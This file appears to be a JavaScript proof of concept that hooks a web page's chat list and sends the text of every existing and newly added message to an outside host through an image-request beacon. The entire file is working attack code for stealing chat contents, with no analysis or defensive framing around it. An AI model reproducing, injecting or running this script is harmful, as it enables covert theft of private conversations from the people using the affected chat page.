// poc.js
;(function() {
  const EXFIL_ENDPOINT = 'https://44.paresh.ninja/collect';

  function exfil(text) {
    const img = new Image();
    img.src = EXFIL_ENDPOINT + '?msg=' + encodeURIComponent(text);
    console.log('📤 exfiltrated:', text);
  }

  // auto‐find the chat <ul>
  const chatList = Array.from(document.querySelectorAll('ul'))
    .find(ul =>
      ul.querySelector('li') &&
      Array.from(ul.querySelectorAll('li')).some(li => li.innerText.trim())
    );

  if (!chatList) {
    return console.error('❌ chat container not found');
  }
  console.log('✅ hooked chatList:', chatList);

  // watch for new messages
  new MutationObserver(muts => {
    muts.forEach(m => {
      m.addedNodes.forEach(node => {
        if (node.nodeType === 1) {
          const txt = node.innerText.trim();
          if (txt) exfil(txt);
        }
      });
    });
  }).observe(chatList, { childList: true });

  // also exfil existing messages
  chatList.querySelectorAll('li').forEach(li => {
    const txt = li.innerText.trim();
    if (txt) exfil(txt);
  });

  console.log('🕵️‍♂️ PoC running!');
})();
